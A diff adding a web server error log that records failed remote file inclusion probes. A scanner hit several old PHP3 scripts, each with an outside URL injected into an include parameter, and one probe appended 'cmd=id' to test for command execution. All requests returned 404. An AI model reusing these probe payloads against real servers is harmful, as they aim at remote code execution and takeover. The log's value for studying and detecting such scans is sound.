@@ -1,0 +1,44 @@
+%% [Sun Mar  9 12:41:38 2014] GET /agenda.php3?rootagenda=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/agenda.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:41:38 2014] GET /agenda2.php3?rootagenda=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/agenda2.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:42:18 2014] GET /bingoserver.php3?response_dir=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/bingoserver.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:44:00 2014] GET /config.inc.php3?rel_path=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/config.inc.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:44:47 2014] GET /depouilg.php3?NomVote=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/depouilg.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:44:58 2014] GET /dix.php3?url_phpartenaire=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/dix.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:47:43 2014] GET /index.php3?Application_Root=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/index.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:49:23 2014] GET /login.php3?cl_headers=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/login.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:49:41 2014] GET /menu.php3?cl_headers=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/menu.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:51:14 2014] GET /owimg.php3?path=http://www.google.com/humans.txt? HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/owimg.php3
+%error
+script not found or unable to stat
+%% [Sun Mar  9 12:51:27 2014] GET /phpMyChat.php3?=http://www.google.com/humans.txt?cmd=id HTTP/1.0
+%% 404 /z/dr/lifelineprc2000/us2/phpMyChat.php3
+%error
+script not found or unable to stat
